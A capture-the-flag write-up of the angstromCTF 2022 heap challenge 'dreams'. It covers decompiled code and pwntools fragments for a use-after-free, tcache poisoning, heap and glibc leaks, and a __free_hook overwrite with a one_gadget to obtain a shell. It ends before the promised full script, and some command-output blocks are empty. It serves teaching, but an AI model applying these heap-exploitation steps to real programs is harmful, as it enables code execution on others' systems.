# dreams_angstrom_22

## preamble

This is my first write-up but I had a really pleasant experience with this problem and felt like sharing.  A group of University of Delaware CTFers get together every Wednesday afternoon and train together and this week there was a live CTF during our session with only about 3 hours left in it.  So we jumped in and divvied up the PWN problems.  This is the only problem in this Angstrom that I attempted this year and it was done under time pressure.  Picked it because it had a nice solves to points ratio and I wanted a challenge.

# My PWN framework

When I tackle a PWN I have to answer three questions:

1) What is my __strategic goal__? (Win function?  One Gadget?  Shellcode? syscalls? Libc goodies?)
2) How will I __control the instruction pointer__?  (control the stack at a `ret`? Write-What-Where plus one of GOT overwrite, `__malloc_hook`, `__free_hook`, FSOP, or something else?)
3) Do I need leaks to __conquer randomization__? (Need a Stack leak? glibc leak? Code segment leak? Heap leak?)

----

## The pre-reversing scouting

Step one, run `checksec` and what do we see?

```diff

OK so we're on alert for some sort of symbol that will add benefit.  Let's poke through the symbols using `rabin2 -s dreams` and see what we see.  I'll highlight the lines that stood out to me (and stripped the first lines that weren't as interesting):

```

OK so `malloc` and `free` from glibc along with a `menu`, this sounds like a heap problem.  Also of note: **dreams, gosleep, sell, psychiatrist, MAX_DREAMS**

Absent from this list is any kind of a win function.  So that's one less option for my __strategic goal__ question, next let's check for one gadgets.

```diff
root@vip:/ctf/work/vip/angstrom/raw# one_gadget libc.so.6
+ 0xe3b2e execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL

+ 0xe3b31 execve("/bin/sh", r15, rdx)

+ 0xe3b34 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
```

Awesome, these look reasonable, tentative __strategic goal__ penciled in.

Now, how are we going to __control the instruction pointer__? So the checksec ruled out GOT and stack control (probably) plus it's a heap problem so I'm guessing `__malloc_hook` or `__free_hook`.  Let's do a quick check of the glibc version to make sure it's not 2.34 (where the malloc/free hooks are finally gone).

So to validate the version I turned to `https://libc.blukat.me/` using `rabin2 -s libc.so.6` to grab a couple offsets and actually realized I recognized the offset of `printf` already! I had given learners the task of finding this library just using `cc0` before.  
It is the same glibc 2.31 from my Ubuntu 20.04 running `pwndocker`.  Small world.

Anyhow, it's 2.31 and that means `__free_hook` and `__malloc_hook` are good candidates.

We're going to need a _write-what-where_ somehow to pull that off of course.

The last strategic question was how we're going to __conquer randomization__?  We'll need a little more scouting to solve those last two, the write-what-where and making leaks.

## Reversing the binary

Alright we need leaks and a write-what-where.  When reversing a typical malloc menu I want to see all of the frees, mallocs, and edits.

The menu has 3 options: `psychiatrist`, `gosleep`, and `sell`.  Here's the Ghidra decompiled main:

```c
void main(void)

{
  long in_FS_OFFSET;
  int local_18;
  __gid_t local_14;
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  setbuf(stdout,(char *)0x0);
  local_14 = getegid();
  setresgid(local_14,local_14,local_14);
  dreams = malloc((long)(MAX_DREAMS << 3));
  puts("Welcome to the dream tracker.");
  puts(
      "Sleep is where the deepest desires and most pushed-aside feelings of humankind are brought out."
      );
  puts("Confide a month of your time.");
  local_18 = 0;
  while( true ) {
    while( true ) {
      menu();
      printf("> ");
      __isoc99_scanf(&DAT_00402104,&local_18);
      getchar();
      if (local_18 != 3) break;
      psychiatrist();
    }
    if (3 < local_18) break;
    if (local_18 == 1) {
      gosleep();
    }
    else {
      if (local_18 != 2) break;
      sell();
    }
  }
  puts("Invalid input!");
                    /* WARNING: Subroutine does not return */
  exit(1);
}
```

OK so `dreams = malloc((long)(MAX_DREAMS << 3));` happens every time, both `MAX_DREAMS` and `dreams` are global variables.  `MAX_DREAMS` is set to 5 and we know the address is `0x00404010`.  So that means the opening malloc is for 40 bytes.

The first thing I did was fire up gdb (pwndbg) and check to see if the `MAX_DREAMS` segment was readable and writable, it was, so keep its malleability in mind.

Alright, also at this point I'm guessing `gosleep` will be a malloc, `sell` will be a free, and `psychiatrist` will be an edit or something.

Let's check it out,  `gosleep`:

```c
void gosleep(void)

{
  size_t sVar1;
  long in_FS_OFFSET;
  int local_1c;
  char *local_18;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("3 doses of Ambien finally calms you down enough to sleep.");
  puts("Toss and turn all you want, your unconscious never loses its grip.");
  printf("In which page of your mind do you keep this dream? ");
  local_1c = 0;
  __isoc99_scanf(&DAT_00402104,&local_1c);
  getchar();
  if (((local_1c < MAX_DREAMS) && (-1 < local_1c)) && (*(long *)(dreams + (long)local_1c * 8) == 0))
  {
    local_18 = (char *)malloc(0x1c);
    printf("What\'s the date (mm/dd/yy))? ");
    read(0,local_18,8);
    sVar1 = strcspn(local_18,"\n");
    local_18[sVar1] = '\0';
    printf("On %s, what did you dream about? ",local_18);
    read(0,local_18 + 8,0x14);
    *(char **)((long)local_1c * 8 + dreams) = local_18;
    if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
      __stack_chk_fail();
    }
    return;
  }
  puts("Invalid index!");
                    /* WARNING: Subroutine does not return */
  exit(1);
}
```

OK so a few notes here:

1) it asks for an index which should be a value from 0 to `MAX_DREAMS-1`
2) whatever your index `i` is the code will put a pointer made from `malloc(28)` at `dreams + 8*i` (in other words `dreams` is an array of pointers to small chunks)
3) the first 8 bytes of the new chunk are given first
4) the next 20 bytes of the chunk are given next

Let's look at the edit function `psychiatrist`:

```c
void psychiatrist(void)

{
  long in_FS_OFFSET;
  int local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("Due to your HMO plan, you can only consult me to decipher your dream.");
  printf("What dream is giving you trouble? ");
  local_14 = 0;
  __isoc99_scanf(&DAT_00402104,&local_14);
  getchar();
  if (*(long *)(dreams + (long)local_14 * 8) == 0) {
    puts("Invalid dream!");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  printf("Hmm... I see. It looks like your dream is telling you that ");
  puts((char *)(*(long *)(dreams + (long)local_14 * 8) + 8));
  puts(
      "Due to the elusive nature of dreams, you now must dream it on a different day. Sorry, I don\'t make the rules. Or do I?"
      );
  printf("New date: ");
  read(0,*(void **)(dreams + (long)local_14 * 8),8);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

OK interesting:

1) If you call this function on an index that points to a null address you will crash the program
2) It will display the values in your requested chunk starting 8 bytes in
3) It will overwrite the first 8 bytes of your chunk

So immediately we should be thinking of editing a `fd` pointer inside of the tcache once a chunk is free'd.  That would make for a great __write-what-where__ (known as tcache-poisoning, see https://github.com/shellphish/how2heap/blob/master/glibc_2.31/tcache_poisoning.c).

Also it's possible we can get a __leak__ out of this function but we'll need the address to be 8 bytes into the chunk which only happens for chunks in the unsorted bins, small bins, or large bins.  So far we're limited to making small chunks, so getting into those other bins will take some work.

Before even reversing the free function I start to test if a use-after-free exists here.  It totally does.

OK onto the free function, `sell`:

```c
void sell(void)

{
  long in_FS_OFFSET;
  int local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("You\'ve come to sell your dreams.");
  printf("Which one are you trading in? ");
  local_14 = 0;
  __isoc99_scanf(&DAT_00402104,&local_14);
  getchar();
  if ((local_14 < MAX_DREAMS) && (-1 < local_14)) {
    puts("You let it go. Suddenly you feel less burdened... less restrained... freed. At last.");
    free(*(void **)(dreams + (long)local_14 * 8));
    puts("Your money? Pfft. Get out of here.");
    if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
      __stack_chk_fail();
    }
    return;
  }
  puts("Out of bounds!");
                    /* WARNING: Subroutine does not return */
  exit(1);
}
```

Nothing too noteworthy here, other than the absence of clearing the free'd pointer.

Alright so what did we learn while reversing?

1) We cannot control the chunk sizes
2) We can use-after-free
3) We can leak but only 8 bytes after the start of the chunk
4) We can create a write-what-where using tcache-poisoning

What have we not learned yet?  Well, we could win right now IF we had a glibc leak and one of the one_gadgets is viable.

But we don't have any leaks yet really.  So we have to get clever.

## The Planned Exploit

TLDR: change MAX_DREAMS to a large value, generate a heap leak by using a large index and dropping a chunk's address into an area I can read, then do house of spirit to create a glibc leak.

OK so, hear me out, we have a write-what-where, and it's fairly simple too: 
1) malloc A, 
2) malloc B, 
3) free A, 
4) free B, 
5) set the first 8 bytes of B to my target address, 
6) malloc C,
7) finally malloc D will give me any address I'd like.

(I had immediately setup the write-what-where and was excited until I realized I had no idea what to target.)

So, if we can overwrite `MAX_DREAMS` (which we do know an address to) then we can malloc a large number of chunks.

If I can malloc a large block of chunks I _could_ use a heap-leak plus our WWW to help me overwrite the `size_field` of the first chunk in a block of chunks.  Now when we free it will pretend to be a much larger chunk (`house_of_spirit` style), that will let us synthesize both a `fd` and `bk` pointer which we can use the leak/edit function to get our glibc address.

### Changing MAX_DREAMS

Alright, so when I set about targeting MAX_DREAMS my first versions looked like this (I wrote some utilities for `malloc`, `free`, and `hack` which you can see in the full exploit script at the bottom:

```python
malloc(0, "pay1", "pay2")
malloc(1, "pay3", "pay4")
free(0)
free(1)
hack(1, p64(elf.sym.MAX_DREAMS))
malloc(2, "junk1", "junk2")
malloc(3, b"\xff\xff", b"junk3")
```

This, annoyingly, didn't work.  Also the glibc they gave us didn't have debug symbols which means I couldn't use the cool `bins` command to inspect my tcache exploit.  So I pulled out the debug glibc 2.31 (different one_gadgets so I went right back after debug mode).  

I could confirm that I `MAX_DREAMS` was inside of the tcache, but take a look at what was going on:

```bash
pwndbg> bins
tcachebins
0x30 [  2]: 0x12c2310 —▸ 0x404010 (MAX_DREAMS) ◂— 0x5
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
pwndbg>
```

That value `0x5` currently in `MAX_DREAMS` was trying to be loaded into tcache.  So I went looking for a target nearby that was already a null pointer and I'd just have to his the `MAX_DREAMS` from an offset.  I used `dq &0x404010-32` to poke around and find a suitable target.

OK so once we can set `MAX_DREAMS` to any value we want, what next?  I know I want to make a bunch of chunks in a rows to make a fake chunk, but how exactly will I edit the chunk's metadata?  Well if you have a WWW hammer everything is a nail, but we'll need a heap leak next.

### Generating our heap_leak

The next thing I did was fart around with our new malloc limits, we can assign dreams to any index we'd like.  OH WAIT.  How did that code work again?  AH so if I assign my chunk's address to `i` it will write the chunk's address (a _heap_ address mind you) to `dreams + 8*i`, awesome!  So that means I can make a chunk, figure out how far from `dreams` it is, then ask for that distance/8 and it will drop a heap address right into my chunk.  If I target chunk+8 then I can leak that heap address!  OK next task, our heap leak.  The pwntools segment looked like this:

```python
malloc(533, "FINDME", "PAY2")
chunkleak = heapleak(533)
heapbase = chunkleak - 4928
print(hex(heapbase))
```

Now that's the finished product, how on earth did I get 533 and 4928 you ask?  Well I did `malloc(10, "FINDME", "PAYLOAD2")` and inspected by chunks using pwndbg's `vis` command.  Now I can never scroll properly when I'm tmux split-screening so I also used the `heap` command and `dq someaddress` to find the address of `dream` and the address of my latest chunk+8.  When I subtracted them I got 4264, which led to adjusting `10` to `4264//8 == 533`.  Then I wrote a `heapleak` utility function to call the edit and parse my leaked address using `u64`.  Once I had that address in hand I checked its distance from the beginning of heap which was 4928.  Both of these numbers are VERY SPECIFIC to my exact exploit.  If I made a few more or less mallocs before that moment both would need to be recomputed.

### From heap_leak to glibc_leak (baby house of spirit)

I'm not totally sure if this is the textbook house of spirit or not, but here was my idea.  

Make enough chunks back to back that I know their entire length is more than 0x420 (easy to remember the tcache cut-off).

Use our heap leak and WWW to target the size_field of the first chunk in our block of chunks.  Then free the first chunk 
which will make a large, fake, chunk that will go into the unsorted bin.

Alright here's my python:

```python
#making a block of chunks adjacent to each other, each of size 48
for i in range(25):
    malloc(10+i, "fake-"+str(i), "fake2-"+str(i))
#altogether these make 1200 bytes

#Now we setup our write-what-where via tcache poisoning
malloc(35, "free1", "free1p")
malloc(36, "free2", "free2p")
free(35)
free(36)

#this target is 16 bytes before the 10th chunk
offset = 4952
targethere = heapbase + offset

hack(36, p64(targethere))

malloc(37, "junk", "junk2")
malloc(38, "junk", p64(0) + p64(0x4b1))
#OK chunk 10 now looks like it has size 1200 (and prev_in_use flag set to 1)
free(10)
```

That just worked.  I was really pleased.  For about 5 minutes.

Getting the glibc leaks was easy enough, just had to debug and calculate some offsets to get something like this:

```python
glibcleak = heapleak(10) #glibc
glibcbase = glibcleak - 2018272 #mainarena + 88 if I recall correctly
oneg=0xe3b2e
onegadget = glibcbase + oneg
freehook = glibcleak + 8808
```

I was so ready to just win at this point (time was running out) then I setup the rest of the exploit just in case:

```python
malloc(41, "free1", "free1a")
malloc(42, "free2", "free2a")
free(41)
free(42)
hack(42, p64(freehook-16))
malloc(43, "junk", "junk2")
malloc(44, "junk", p64(0) + p64(onegadget))
free(43)
```

This would setup the last write-what-where and drop our onegadget into the `__free_hook`.  BUT NO.

So what was wrong with this picture?  Well, if I do a malloc and all of the tcache and fastbins are empty, then it's going to check the unsorted bins.  But if you ran `bins` after my glibc leak, you'd see the unsorted bins were labelled `corrupted`.  I started to panic there wasn't time to figure out how to make my fake chunk more real, only 30 minutes left and I had to get home ASAP too.

But then it struck me,  if the tcache isn't empty, there's no problem, so let's just malloc those WWW chunks BEFORE we free the fake one.

The rest was history, 24 minutes left in the CTF and I cracked a proper heap problem!

Here's the script including the utilities:
